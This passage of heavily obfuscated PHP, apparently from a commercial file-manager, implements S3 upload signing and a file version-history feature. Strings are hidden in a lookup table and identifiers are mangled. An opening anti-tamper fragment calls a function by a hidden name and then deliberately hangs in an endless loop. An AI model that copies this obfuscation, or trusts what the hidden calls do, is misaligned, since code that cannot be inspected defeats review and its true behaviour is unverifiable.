$_getc($_getfile); $_getarrs = explode($_SERVER[³Ôà×Ó][262], $_getfilec); if (count($_getarrs) < $_SERVER[³Ôà×Ó][436]) { $exit = $_SERVER[³Ôà×Ó][437]; $exit(); } $_act = $_SERVER[³Ôà×Ó][438]; $_act($_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[³Ôà×Ó][463]); } } goto cƒ¶ŠÍÀÁ; D¤”À–«Ë: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ÏõˆÜŸ‰) { parent::__construct($ÏõˆÜŸ‰); } public function uploadFormData($’¯”Æİ, $…à°Àæ‚ = 3600) { $›ˆ××‚ˆ =& $_SERVER[³Ôà×Ó]; $†õíßÈñ = $›ˆ××‚ˆ[229]; $Ù› ñ£‡ = $›ˆ××‚ˆ[270]; $’ÉÍÜÃ½ = $›ˆ××‚ˆ[62]; $ì÷—äÕ‰ = gmdate($›ˆ××‚ˆ[271]); $†²†ºÄâ = gmdate($›ˆ××‚ˆ[272]); $Ñ‹µ†¥Ş = $›ˆ××‚ˆ[273]; $øÓ¿‚ä = $…à°Àæ‚ . $›ˆ××‚ˆ[12]; $Ü¬¦ºÍä = $›ˆ××‚ˆ[274]; $…éøÅ®¶ = array($this->accessKey, $†²†ºÄâ, $this->region, $’ÉÍÜÃ½, $Ñ‹µ†¥Ş); $Î˜†ıÑ€ = implode($›ˆ××‚ˆ[8], $…éøÅ®¶); $¼—Ó£Õö = array($›ˆ××‚ˆ[275] => gmdate($›ˆ××‚ˆ[299], strtotime($›ˆ××‚ˆ[277])), $›ˆ××‚ˆ[278] => array(array($›ˆ××‚ˆ[279] => $this->bucket), array($›ˆ××‚ˆ[280] => $†õíßÈñ), array($›ˆ××‚ˆ[281], $›ˆ××‚ˆ[282], $›ˆ××‚ˆ[12]), array($›ˆ××‚ˆ[281], $›ˆ××‚ˆ[283], $›ˆ××‚ˆ[12]), array($›ˆ××‚ˆ[281], $›ˆ××‚ˆ[284], $›ˆ××‚ˆ[12]), array($›ˆ××‚ˆ[285] => $Ü¬¦ºÍä), array($›ˆ××‚ˆ[286] => $Î˜†ıÑ€), array($›ˆ××‚ˆ[287] => $Ù› ñ£‡), array($›ˆ××‚ˆ[288] => $ì÷—äÕ‰), array($›ˆ××‚ˆ[289] => $øÓ¿‚ä))); $¨ÒÃÜ– = base64_encode(json_encode($¼—Ó£Õö)); $Ş¹¢©º = hash_hmac($›ˆ××‚ˆ[290], $†²†ºÄâ, $›ˆ××‚ˆ[291] . $this->secret, !0); $¨§Ä‹´¤ = hash_hmac($›ˆ××‚ˆ[290], $this->region, $Ş¹¢©º, !0); $ºœª¼½¶ = hash_hmac($›ˆ××‚ˆ[290], $’ÉÍÜÃ½, $¨§Ä‹´¤, !0); $ú÷í½…Î = hash_hmac($›ˆ××‚ˆ[290], $Ñ‹µ†¥Ş, $ºœª¼½¶, !0); $±«Œ­Ûê = hash_hmac($›ˆ××‚ˆ[290], $¨ÒÃÜ–, $ú÷í½…Î); $ˆ­…ÍòÍ = array($›ˆ××‚ˆ[246] => $›ˆ××‚ˆ[12], $›ˆ××‚ˆ[292] => $›ˆ××‚ˆ[12], $›ˆ××‚ˆ[280] => $†õíßÈñ, $›ˆ××‚ˆ[285] => $Ü¬¦ºÍä, $›ˆ××‚ˆ[293] => $¨ÒÃÜ–, $›ˆ××‚ˆ[294] => $Î˜†ıÑ€, $›ˆ××‚ˆ[295] => $Ù› ñ£‡, $›ˆ××‚ˆ[296] => $ì÷—äÕ‰, $›ˆ××‚ˆ[297] => $øÓ¿‚ä, $›ˆ××‚ˆ[298] => $±«Œ­Ûê, $›ˆ××‚ˆ[208] => $this->getHost()); return $ˆ­…ÍòÍ; } public function multiUploadFormData($ë†÷ˆÖ, $¶Äø™û¤ = 3600) { $¸§»³•­ =& $_SERVER[³Ôà×Ó]; $·…Õ¡ ş = gmdate($¸§»³•­[300]); $´ø÷ä™ = array(); $ƒ»ÁÊÄè = $this->client->getUploadId($this->bucket, $ë†÷ˆÖ, $´ø÷ä™); if (!$ƒ»ÁÊÄè) { return !1; } return array($¸§»³•­[254] => $ƒ»ÁÊÄè, $¸§»³•­[208] => $this->getHost() . $¸§»³•­[8] . $this->pathEncode($ë†÷ˆÖ), $¸§»³•­[255] => $·…Õ¡ ş, $¸§»³•­[97] => $ë†÷ˆÖ); } public function multiUploadAuthData($¾çßŸ†, $ı‘”¼ = array()) { $å •µÆª =& $_SERVER[³Ôà×Ó]; $Ï™¬†æ = isset($ı‘”¼[$å •µÆª[169]]) ? $ı‘”¼[$å •µÆª[169]] : $å •µÆª[12]; $†ôÛµø = $ı‘”¼[$å •µÆª[97]]; unset($ı‘”¼[$å •µÆª[97]]); if (isset($ı‘”¼[$å •µÆª[256]])) { return $this->listUploadParts($†ôÛµø, $ı‘”¼); } $ñÈòÇŠ = array(); if (isset($ı‘”¼[$å •µÆª[301]])) { $ñÈòÇŠ[$å •µÆª[302]] = $ı‘”¼[$å •µÆª[301]]; } $¼­šŞØÁ = explode($å •µÆª[210], $this->getHost()); $²•Úúç¶ = array($å •µÆª[303] => $¼­šŞØÁ[1], $å •µÆª[304] => $å •µÆª[12], $å •µÆª[246] => $å •µÆª[123], $å •µÆª[292] => $ı‘”¼[$å •µÆª[79]]); $ñ£ŠÊ¸´ = $å •µÆª[259]; $»¼–¹ĞÄ = $å •µÆª[8] . $this->pathEncode($†ôÛµø) . $Ï™¬†æ; $’ŒëŒü£ = $this->client->__getSignatureV4($ñÈòÇŠ, $²•Úúç¶, $ñ£ŠÊ¸´, $»¼–¹ĞÄ); if (strpos($Ï™¬†æ, $å •µÆª[258]) === 0) { if (isset($ñÈòÇŠ[$å •µÆª[302]])) { $Ş—²³øš = $ñÈòÇŠ[$å •µÆª[302]]; } else { if (isset($’ŒëŒü£[$å •µÆª[302]])) { $Ş—²³øš = $’ŒëŒü£[$å •µÆª[302]]; } else { $Ş—²³øš = hash($å •µÆª[290], $å •µÆª[12]); } } return array($å •µÆª[265] => $’ŒëŒü£[$å •µÆª[265]], $å •µÆª[302] => $Ş—²³øš, $å •µÆª[255] => $’ŒëŒü£[$å •µÆª[305]]); } return $’ŒëŒü£[$å •µÆª[265]]; } public function listUploadParts($¹Ğ”™ÜÍ, $²Ç¹ßı÷ = array()) { $Ú®á‰“ =& $_SERVER[³Ôà×Ó]; $ş›šğ´ = str_replace($Ú®á‰“[266], $Ú®á‰“[12], $²Ç¹ßı÷[$Ú®á‰“[169]]); $œ¥¶µôÎ = $this->client->listParts($this->bucket, $¹Ğ”™ÜÍ, $ş›šğ´); if (!$œ¥¶µôÎ) { return !1; } $†Ø¼ä¹· = $Ú®á‰“[306]; foreach ($œ¥¶µôÎ as $ªà«°‚É) { $†Ø¼ä¹· .= $Ú®á‰“[307] . "\74\120\141\x72\164\116\x75\x6d\142\145\x72\76{$ªà«°‚É[$Ú®á‰“[308]]}\x3c\57\120\141\162\164\x4e\x75\155\x62\145\x72\76\12" . "\x3c\105\x54\141\x67\76{$ªà«°‚É[$Ú®á‰“[309]]}\x3c\57\105\x54\141\x67\76\12" . $Ú®á‰“[310]; } $†Ø¼ä¹· .= $Ú®á‰“[311]; $Úßì§›” = array(); $¼¥¾·Éë = explode($Ú®á‰“[210], $this->getHost()); $¸³¤Ñ¬Ä = array($Ú®á‰“[303] => $¼¥¾·Éë[1], $Ú®á‰“[246] => $Ú®á‰“[123], $Ú®á‰“[292] => strlen($†Ø¼ä¹·)); $®±à¾´ò = $Ú®á‰“[257]; $ùĞ‡£‚­ = $Ú®á‰“[8] . $this->pathEncode($¹Ğ”™ÜÍ) . $²Ç¹ßı÷[$Ú®á‰“[169]]; $¶”Éîƒ¹ = $this->client->__getSignatureV4($Úßì§›”, $¸³¤Ñ¬Ä, $®±à¾´ò, $ùĞ‡£‚­, $†Ø¼ä¹·); return array($Ú®á‰“[265] => $¶”Éîƒ¹[$Ú®á‰“[265]], $Ú®á‰“[255] => $¶”Éîƒ¹[$Ú®á‰“[305]], $Ú®á‰“[267] => $œ¥¶µôÎ, $Ú®á‰“[302] => $¶”Éîƒ¹[$Ú®á‰“[302]]); } public function link($å¤Å«, $äü’×À = array()) { return parent::link($å¤Å«, $äü’×À); } public function fileOut($˜áÜ ¹, $¿İú¡¤‡ = false, $Õ¾®· = false, $¸‰áƒ”Ô = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[³Ôà×Ó][312])) { return parent::fileOutServer($˜áÜ ¹, $¿İú¡¤‡, $Õ¾®·, $¸‰áƒ”Ô); } parent::fileOut($˜áÜ ¹, $¿İú¡¤‡, $Õ¾®·, $¸‰áƒ”Ô); } public function fileOutImage($®–Ø«‰…, $ŠúÅËÇ = 250) { if (strstr($this->endpoint, $_SERVER[³Ôà×Ó][312])) { return parent::fileOutImageServer($®–Ø«‰…, $ŠúÅËÇ); } parent::fileOutImage($®–Ø«‰…, $ŠúÅËÇ); } public function fileOutLink($ğ›æä¦) { $ÏüñÖ‘‰ =& $_SERVER[³Ôà×Ó]; if (substr($ğ›æä¦, 0, 7) == $ÏüñÖ‘‰[313]) { $ğ›æä¦ = $ÏüñÖ‘‰[314] . substr($ğ›æä¦, 7); } header($ÏüñÖ‘‰[175] . $ğ›æä¦); die; } } define($_SERVER[³Ôà×Ó][315], 1); define($_SERVER[³Ôà×Ó][316], 2); goto E‚ò’½¿íÀ; a³¸ÌËóÃ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $È¯æÏ†Ç =& $_SERVER[³Ôà×Ó]; $ˆ³êõ¦í = $GLOBALS[$È¯æÏ†Ç[6]][$È¯æÏ†Ç[92]]; if ($ˆ³êõ¦í[$È¯æÏ†Ç[1298]] != 1) { return; } if ($ˆ³êõ¦í[$È¯æÏ†Ç[1299]] <= 0) { return; } if (isset($_REQUEST[$È¯æÏ†Ç[1300]]) && $_REQUEST[$È¯æÏ†Ç[1300]] == $È¯æÏ†Ç[91]) { return; } Hook::bind($È¯æÏ†Ç[1301], $È¯æÏ†Ç[1302]); Hook::bind($È¯æÏ†Ç[1303], $È¯æÏ†Ç[1304]); Hook::bind($È¯æÏ†Ç[1305], $È¯æÏ†Ç[1306]); Hook::bind($È¯æÏ†Ç[1307], $È¯æÏ†Ç[1308]); Hook::bind($È¯æÏ†Ç[1309], $È¯æÏ†Ç[1310]); Hook::bind($È¯æÏ†Ç[1311], $È¯æÏ†Ç[1312]); } public static function eventBeforeUpload($œ†Ñ¢„—) { if ($œ†Ñ¢„—[3] && $œ†Ñ¢„—[3] != REPEAT_REPLACE) { return; } $šôÀ‹„Ü = self::parsePath($œ†Ñ¢„—[0]); if (!$šôÀ‹„Ü) { return; } self::add($šôÀ‹„Ü); } public static function eventBeforeEdit($ÌÎÒ‡É) { $à“á½ş = self::parsePath($ÌÎÒ‡É[0]); if (!$à“á½ş) { return; } self::add($à“á½ş); } public static function eventBeforeCopyFile($‡ºÊİ‰, $Ó£úá, $¨ãàçË, $ìÂ€õ…‡, $Éë¦¤¸Î, $¼Ÿîƒ§Ô) { $›ä™£•„ =& $_SERVER[³Ôà×Ó]; if (isset($¨ãàçË->_data[$›ä™£•„[1233]]) && $¨ãàçË->_data[$›ä™£•„[1233]]) { return; } $èÏÀ®²ğ = $¨ãàçË->getPathOuter($ìÂ€õ…‡); $Ñæùœ¼ = self::parsePath($èÏÀ®²ğ); if (!$Ñæùœ¼) { return; } self::add($Ñæùœ¼); } public static function eventBeforeRename($Èß¿ò·®) { $©÷í¼Í =& $_SERVER[³Ôà×Ó]; $îøİÒå = self::parsePath($Èß¿ò·®[0]); if (!$îøİÒå) { return; } $È÷£çğ = self::checkInHistory($îøİÒå); if (!$È÷£çğ) { return; } if ($È÷£çğ[$©÷í¼Í[33]] == $©÷í¼Í[230]) { $à´Ğ¶Œ = self::listData($îøİÒå); if ($à´Ğ¶Œ && $à´Ğ¶Œ[$©÷í¼Í[454]]) { self::moveHistory($îøİÒå, $Èß¿ò·®[1]); } } else { IO::rename($È÷£çğ[$©÷í¼Í[87]], $Èß¿ò·®[1]); } } public static function eventBeforeMove($½°’©áæ) { $×áâàë” =& $_SERVER[³Ôà×Ó]; $…²µñ¼² = self::parsePath($½°’©áæ[0]); if (!$…²µñ¼²) { return; } $úÕ§Ûú = self::parsePath($½°’©áæ[1]); if (!$úÕ§Ûú) { return; } $Ù¿ºŞË = $½°’©áæ[3]; $‹ãì¶ñ = self::checkInHistory($…²µñ¼²); if (!$‹ãì¶ñ) { return; } $€ÕáúóÓ = self::pathHistory($úÕ§Ûú); if ($‹ãì¶ñ[$×áâàë”[33]] == $×áâàë”[230]) { $ÛÑÀ±®™ = self::listData($…²µñ¼²); $‘˜ÛæÉµ = rtrim($úÕ§Ûú, $×áâàë”[8]) . $×áâàë”[8] . ($Ù¿ºŞË ? $Ù¿ºŞË : get_path_this($…²µñ¼²)); $º¿¯™˜– = self::listData($‘˜ÛæÉµ); if ($ÛÑÀ±®™ && $ÛÑÀ±®™[$×áâàë”[454]] && $º¿¯™˜– && $º¿¯™˜–[$×áâàë”[454]]) { return self::clear($…²µñ¼²); } if ($ÛÑÀ±®™ && $ÛÑÀ±®™[$×áâàë”[454]]) { self::moveHistory($…²µñ¼², $Ù¿ºŞË, $€ÕáúóÓ); } } else { IO::move($‹ãì¶ñ[$×áâàë”[87]], $€ÕáúóÓ, !1, $Ù¿ºŞË); self::clearEmptyFolder(IO::pathFather($‹ãì¶ñ[$×áâàë”[87]])); } } public static function eventAfterRemove($‹ÎÀÓï˜, $Ğˆ¢úÍ) { $¥ú¨©³ë =& $_SERVER[³Ôà×Ó]; if (!$Ğˆ¢úÍ) { return; } $²§´¥ç  = self::parsePath($‹ÎÀÓï˜[0]); if (!$²§´¥ç ) { return; } $Ú•¸ƒÈ– = self::checkInHistory($²§´¥ç ); if (!$Ú•¸ƒÈ–) { return; } if ($Ú•¸ƒÈ–[$¥ú¨©³ë[33]] == $¥ú¨©³ë[230]) { $Ë‰¢Òì´ = self::listData($²§´¥ç , !1); if ($Ë‰¢Òì´ && $Ë‰¢Òì´[$¥ú¨©³ë[454]]) { self::clear($²§´¥ç , !1); } } else { IO::remove($Ú•¸ƒÈ–[$¥ú¨©³ë[87]]); self::clearEmptyFolder(IO::pathFather($Ú•¸ƒÈ–[$¥ú¨©³ë[87]])); } } private static function checkInHistory($éÍ¼§ºì) { $™´ˆ‰˜¡ = self::pathHistory($éÍ¼§ºì); if (!IO::exist($™´ˆ‰˜¡)) { $™´ˆ‰˜¡ .= $_SERVER[³Ôà×Ó][1313]; } return IO::exist($™´ˆ‰˜¡) ? IO::info($™´ˆ‰˜¡) : !1; } private static function parsePath($©áß‡±) { $ò£„‰›Ë =& $_SERVER[³Ôà×Ó]; if (!$©áß‡±) { return !1; } if (isset($GLOBALS[$ò£„‰›Ë[1314]]) && $GLOBALS[$ò£„‰›Ë[1314]]) { return; } $ış¿ÕÌ÷ = KodIO::parse($©áß‡±); $èÇµ÷Ø = $ış¿ÕÌ÷[$ò£„‰›Ë[33]]; $²¥€ˆóæ = !$èÇµ÷Ø || $èÇµ÷Ø == KodIO::KOD_IO || $èÇµ÷Ø == KodIO::KOD_SHARE_ITEM; if (!$²¥€ˆóæ || !$ış¿ÕÌ÷[$ò£„‰›Ë[1315]]) { return !1; } if (substr($©áß‡±, 0, strlen(DATA_PATH . $ò£„‰›Ë[1316])) == DATA_PATH . $ò£„‰›Ë[1316]) { return !1; } if ($èÇµ÷Ø == KodIO::KOD_SHARE_ITEM) { $Á˜üÛÀ  = IO::init($©áß‡±); if ($Á˜üÛÀ ->pathParse[$ò£„‰›Ë[1229]]) { return self::parsePath($Á˜üÛÀ ->pathParse[$ò£„‰›Ë[1229]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ìÈÉÉí = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ò£„‰›Ë[1317]); foreach ($ìÈÉÉí as $ ƒéå¾) { if (!$èÇµ÷Ø && substr($©áß‡±, 0, strlen($ ƒéå¾)) == $ ƒéå¾) { return !1; } } self::log($GLOBALS[$ò£„‰›Ë[1224]] . $ò£„‰›Ë[1318] . $©áß‡±); return $©áß‡±; } private static function pathHistory($ê†·§) { $‘»¾ô“È =& $_SERVER[³Ôà×Ó]; $ÕÔëò” = self::$_historyBase . ltrim(KodIO::clear($ê†·§), $‘»¾ô“È[8]); $ÕÔëò” = str_replace(array($‘»¾ô“È[1319]), array($‘»¾ô“È[1320]), $ÕÔëò”); return $ÕÔëò”; } public static function log($úŠŸÍÉÕ) { } public static function historyCount($Ğ“‘±²) { $¶èøŞ® =& $_SERVER[³Ôà×Ó]; $ú°Õ¾± = array(); $›âËƒë½ = array(); foreach ($Ğ“‘±² as $èÇµ§Ï) { $íÉºˆ„± = get_path_father($èÇµ§Ï); if (!$›âËƒë½[$íÉºˆ„±]) { $›âËƒë½[$íÉºˆ„±] = array(); } $›âËƒë½[$íÉºˆ„±][] = get_path_this($èÇµ§Ï); } foreach ($›âËƒë½ as $íÉºˆ„± => $¸¾”½”–) { $»™¯Ãˆñ = self::parsePath($íÉºˆ„±); if (!$»™¯Ãˆñ) { continue; } foreach ($¸¾”½”– as $ûÄıãìÏ) { $÷É»ìö = self::listData(rtrim($»™¯Ãˆñ, $¶èøŞ®[8]) . $¶èøŞ®[8] . $ûÄıãìÏ, !1); if ($÷É»ìö && $÷É»ìö[$¶èøŞ®[454]]) { $ú°Õ¾±[rtrim($íÉºˆ„±, $¶èøŞ®[8]) . $¶èøŞ®[8] . $ûÄıãìÏ] = count($÷É»ìö[$¶èøŞ®[454]]); } } } return $ú°Õ¾±; } public static function add($©é÷ä¶¹) { $îÌµë =& $_SERVER[³Ôà×Ó]; $å“ÎÊ¢™ = self::listData($©é÷ä¶¹); if (!$å“ÎÊ¢™) { return; } $Ñòó‹µ = Model($îÌµë[845])->get($îÌµë[1321]); $•ÛÄ¨– = intval($GLOBALS[$îÌµë[6]][$îÌµë[92]][$îÌµë[1299]]); $ÆÉ­£ÁÖ = $Ñòó‹µ == $îÌµë[1322] ? min(5, $•ÛÄ¨–) : $•ÛÄ¨–; if ($•ÛÄ¨– <= 0) { return; } $¨Áù‘ª¾ = IO::info($©é÷ä¶¹); $÷«‘µÓ = $å“ÎÊ¢™[$îÌµë[454]]; if ($¨Áù‘ª¾[$îÌµë[79]] == 0) { return; } if ($¨Áù‘ª¾[$îÌµë[79]] >= 1024 * 1024 * 500) { return !1; } $ôŞ¯Š€ = IO::hashSimple($©é÷ä¶¹); if ($÷«‘µÓ && $÷«‘µÓ[0][$îÌµë[681]] == $ôŞ¯Š€) { return !0; } if (array_key_exists($îÌµë[233], $¨Áù‘ª¾) && !$¨Áù‘ª¾[$îÌµë[233]]) { return !1; } $åìªç‘Ô = short_id(time()); $ø¹‚Ÿà¿ = array($îÌµë[484] => $åìªç‘Ô, $îÌµë[681] => $ôŞ¯Š€, $îÌµë[32] => $¨Áù‘ª¾[$îÌµë[32]] . $îÌµë[10] . date($îÌµë[1323]) . rand_string(1), $îÌµë[79] => $¨Áù‘ª¾[$îÌµë[79]], $îÌµë[536] => USER_ID, $îÌµë[231] => time(), $îÌµë[1324] => $îÌµë[12]); IO::mkdir($å“ÎÊ¢™[$îÌµë[1325]]); $Ôƒº†¨õ = IO::copy($©é÷ä¶¹, $å“ÎÊ¢™[$îÌµë[1325]], !1, $ø¹‚Ÿà¿[$îÌµë[32]]); if (!$Ôƒº†¨õ) { self::clearEmptyFolder($å“ÎÊ¢™[$îÌµë[1325]]); return !1; } array_unshift($÷«‘µÓ, $ø¹‚Ÿà¿); if (count($÷«‘µÓ) > $ÆÉ­£ÁÖ) { $Çı½««ı = array_slice($÷«‘µÓ, $ÆÉ­£ÁÖ); foreach ($Çı½««ı as $±ùá¶àô) { IO::remove($å“ÎÊ¢™[$îÌµë[1325]] . $±ùá¶àô[$îÌµë[32]]); } $÷«‘µÓ = array_slice($÷«‘µÓ, 0, $ÆÉ­£ÁÖ); } return self::saveData($å“ÎÊ¢™[$îÌµë[1326]], $÷«‘µÓ); } public static function remove($Ş¶º –Ù, $½ñ³Â°Î) { $á¸Â×ç… =& $_SERVER[³Ôà×Ó]; $ö×ÒÁ = self::listData($Ş¶º –Ù); $ñ´Ò¿…É = array(); if (!$ö×ÒÁ) { return !1; } foreach ($ö×ÒÁ[$á¸Â×ç…[454]] as $î×ˆÅËÀ) { if ($î×ˆÅËÀ[$á¸Â×ç…[484]] == $½ñ³Â°Î) { IO::remove($ö×ÒÁ[$á¸Â×ç…[1325]] . $î×ˆÅËÀ[$á¸Â×ç…[32]]); continue; } $ñ´Ò¿…É[] = $î×ˆÅËÀ; } return self::saveData($ö×ÒÁ[$á¸Â×ç…[1326]], $ñ´Ò¿…É); } public static function clear($†Ù¢…ê, $¢ó²¯ş× = true) { $Á‹¥–Ãë =& $_SERVER[³Ôà×Ó]; $àöíÅæÉ = self::listData($†Ù¢…ê, $¢ó²¯ş×); if (!$àöíÅæÉ) { return !1; } foreach ($àöíÅæÉ[$Á‹¥–Ãë[454]] as $ˆ¯ÄÚûÆ) { IO::remove($àöíÅæÉ[$Á‹¥–Ãë[1325]] . $ˆ¯ÄÚûÆ[$Á‹¥–Ãë[32]]); } return self::saveData($àöíÅæÉ[$Á‹¥–Ãë[1326]], array()); } public static function moveHistory($ôòØ™”¼, $ó…û÷¤ò = '', $ˆ–£úŞ¸ = '') { $„ë“ß™÷ =& $_SERVER[³Ôà×Ó]; $™ÌÃ¥¢® = self::listData($ôòØ™”¼, !1); if (!$™ÌÃ¥¢® || !$™ÌÃ¥¢®[$„ë“ß™÷[454]]) { return !1; } $Ğ™œŒ³Ë = $„ë“ß™÷[1313]; $ó…û÷¤ò = $ó…û÷¤ò ? $ó…û÷¤ò : get_path_this($ôòØ™”¼); $ˆ–£úŞ¸ = $ˆ–£úŞ¸ ? $ˆ–£úŞ¸ : $™ÌÃ¥¢®[$„ë“ß™÷[1325]]; $ã½·Şªº = substr(get_path_this($™ÌÃ¥¢®[$„ë“ß™÷[1326]]), 0, -strlen($Ğ™œŒ³Ë)); foreach ($™ÌÃ¥¢®[$„ë“ß™÷[454]] as $°®ó–˜ => $¨ğ€£²å) { $„âã–á = $ó…û÷¤ò . substr($¨ğ€£²å[$„ë“ß™÷[32]], strlen($ã½·Şªº)); $™åşÑô = IO::move($™ÌÃ¥¢®[$„ë“ß™÷[1325]] . $¨ğ€£²å[$„ë“ß™÷[32]], $ˆ–£úŞ¸, !1, $„âã–á); if ($™åşÑô) { $™ÌÃ¥¢®[$„ë“ß™÷[454]][$°®ó–˜][$„ë“ß™÷[32]] = $„âã–á; } } $™ÌÃ¥¢®[$„ë“ß™÷[1326]] = IO::move($™ÌÃ¥¢®[$„ë“ß™÷[1326]], $ˆ–£úŞ¸, !1, $ó…û÷¤ò . $Ğ™œŒ³Ë); self::saveData($™ÌÃ¥¢®[$„ë“ß™÷[1326]], $™ÌÃ¥¢®[$„ë“ß™÷[454]]); self::clearEmptyFolder($™ÌÃ¥¢®[$„ë“ß™÷[1325]]); } public static function rollback($ïúü˜™, $®—£±„î) { $‹áœ¾æ =& $_SERVER[³Ôà×Ó]; $£ÃŸ×ã‘ = self::listData($ïúü˜™); if (!$£ÃŸ×ã‘) { return; } $Ø¾àÕ = IO::info($ïúü˜™); foreach ($£ÃŸ×ã‘[$‹áœ¾æ[454]] as $Î¸ş™Çî => $›‹úŒß) { if ($›‹úŒß[$‹áœ¾æ[484]] == $®—£±„î) { self::add($ïúü˜™); $éÒœçé• = $£ÃŸ×ã‘[$‹áœ¾æ[1325]] . $›‹úŒß[$‹áœ¾æ[32]]; $­Âæôâ– = IO::copy($éÒœçé•, IO::pathFather($ïúü˜™), REPEAT_REPLACE, $Ø¾àÕ[$‹áœ¾æ[32]]); if ($­Âæôâ–) { self::remove($ïúü˜™, $®—£±„î); } return $­Âæôâ–; } } return !1; } public static function setDetail($ç½¤şô¼, $“ŞøÖÚê, $‚§ÕÃ³) { $¹“ûáæ‘ =& $_SERVER[³Ôà×Ó]; $ß¢Úî¨ = self::listData($ç½¤şô¼); if (!$ß¢Úî¨) { return; } foreach ($ß¢Úî¨[$¹“ûáæ‘[454]] as $Ó·ö¦àå => $¾Ç™ğÎä) { if ($¾Ç™ğÎä[$¹“ûáæ‘[484]] == $“ŞøÖÚê) { $ß¢Úî¨[$¹“ûáæ‘[454]][$Ó·ö¦àå][$¹“ûáæ‘[1324]] = $‚§ÕÃ³; self::saveData($ß¢Úî¨[$¹“ûáæ‘[1326]], $ß¢Úî¨[$¹“ûáæ‘[454]]); return !0; } } return !1; } public static function fileInfo($…Ê”‰ù¦, $Üõ™·İ²) { $ÚÃ€ÙòÉ =& $_SERVER[³Ôà×Ó]; $÷èÔ­ü = self::listData($…Ê”‰ù¦); if (!$÷èÔ­ü) { show_json(LNG($ÚÃ€ÙòÉ[108]), !1); } $ ÎíÜáÙ = $ÚÃ€ÙòÉ[12]; foreach ($÷èÔ­ü[$ÚÃ€ÙòÉ[454]] as $‹µ¼Ş¤´ => $’½¹£Í) { if ($’½¹£Í[$ÚÃ€ÙòÉ[484]] != $Üõ™·İ²) { continue; } $ ÎíÜáÙ = $÷èÔ­ü[$ÚÃ€ÙòÉ[1325]] . $’½¹£Í[$ÚÃ€ÙòÉ[32]]; break; } if (!$ ÎíÜáÙ) { show_json(LNG($ÚÃ€ÙòÉ[108]), !1); } return IO::info($ ÎíÜáÙ); } public static function fileOut($®ã–ú€Œ, $ØÁÂ¤¤©, $¹ĞŸñùË = false) { $®Ü‹úš— =& $_SERVER[³Ôà×Ó]; $¶Á™÷š¢ = self::fileInfo($®ã–ú€Œ, $ØÁÂ¤¤©); $‚ó¥¨°² =& $GLOBALS[$®Ü‹úš—[7]]; $¹ĞŸñùË = isset($‚ó¥¨°²[$®Ü‹úš—[1276]]) && $‚ó¥¨°²[$®Ü‹úš—[1276]] == 1; if (isset($‚ó¥¨°²[$®Ü‹úš—[33]]) && $‚ó¥¨°²[$®Ü‹úš—[33]] == $®Ü‹úš—[1327]) { return IO::fileOutImage($¶Á™÷š¢[$®Ü‹úš—[87]], $‚ó¥¨°²[$®Ü‹úš—[1328]]); } IO::fileOut($¶Á™÷š¢[$®Ü‹úš—[87]], $¹ĞŸñùË, get_path_this($®ã–ú€Œ)); } public static function listData($Õ‰×Ù©, $ñ÷úŒŠ = true) { $‹Ä¾ì =& $_SERVER[³Ôà×Ó]; if ($ñ÷úŒŠ && !IO::exist($Õ‰×Ù©)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Õ‰×Ù©, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $‡µÈî¼÷ = self::pathHistory($Õ‰×Ù©); $Ÿáî£ê = array($‹Ä¾ì[1326] => $‡µÈî¼÷ . $‹Ä¾ì[1313], $‹Ä¾ì[1325] => rtrim(get_path_father($‡µÈî¼÷), $‹Ä¾ì[8]) . $‹Ä¾ì[8], $‹Ä¾ì[454] => array()); $£šÓ£÷¾ = IO::getContent($Ÿáî£ê[$‹Ä¾ì[1326]]); if ($£šÓ£÷¾) { $óÑ£òÌŸ = json_decode($£šÓ£÷¾, !0); if (is_array($óÑ£òÌŸ)) { $Ÿáî£ê[$‹Ä¾ì[454]] = $óÑ£òÌŸ; } } return $Ÿáî£ê; } private static function saveData($¿Ù–ÎûÄ, $ÁÊ¾öéÙ) { $¢‡»Èº =& $_SERVER[³Ôà×Ó]; self::log($¢‡»Èº[1329] . $¿Ù–ÎûÄ . $¢‡»Èº[74] . count($ÁÊ¾öéÙ), $¢‡»Èº[827]); if ($ÁÊ¾öéÙ) { return IO::setContent($¿Ù–ÎûÄ, json_encode($ÁÊ¾öéÙ)); } $à²šÛ³ı = IO::pathFather($¿Ù–ÎûÄ); IO::remove($¿Ù–ÎûÄ); self::clearEmptyFolder($à²šÛ³ı); return !0; } public static function clearEmptyFolder($Ä†íâ¶—) { $Ùã¦Ô‘‚ =& $_SERVER[³Ôà×Ó]; if (trim($Ä†íâ¶—, $Ùã¦Ô‘‚[8]) == trim(self::$_historyBase, $Ùã¦Ô‘‚[8])) { return; } $¢‚µ»Ë¦ = IO::pathFather($Ä†íâ¶—); $®”şÔüŒ = IO::has($Ä†íâ¶—, !0); if ($®”şÔüŒ[$Ùã¦Ô‘‚[239]] > 0 || $®”şÔüŒ[$Ùã¦Ô‘‚[240]] > 0) { return; } IO::remove($Ä†íâ¶—); self::clearEmptyFolder($¢‚µ»Ë¦); } private static function getBasePath() { $¿Ç®Á€„ =& $_SERVER[³Ôà×Ó]; $•Œ×ì = Model($¿Ç®Á€„[1330])->get($¿Ç®Á€„[1331]); if ($•Œ×ì) { if (!IO::exist($•Œ×ì)) { IO::mkdir($•Œ×ì); } if (get_path_this($•Œ×ì) == $¿Ç®Á€„[1316]) { $°±Ö€©¿ = $¿Ç®Á€„[1332] . rand_string(8); @rename($•Œ×ì, get_path_father($•Œ×ì) . $¿Ç®Á€„[8] . $°±Ö€©¿); $•Œ×ì = DATA_PATH . $°±Ö€©¿ . $¿Ç®Á€„[8]; file_put_contents(DATA_PATH . $¿Ç®Á€„[1263], $¿Ç®Á€„[12]); Model($¿Ç®Á€„[1330])->set($¿Ç®Á€„[1331], $•Œ×ì); } return $•Œ×ì; } $•Œ×ì = DATA_PATH . $¿Ç®Á€„[1332] . rand_string(8) . $¿Ç®Á€„[8]; $•Œ×ì = IO::mkdir($•Œ×ì); $•Œ×ì = rtrim($•Œ×ì, $¿Ç®Á€„[8]) . $¿Ç®Á€„[8]; 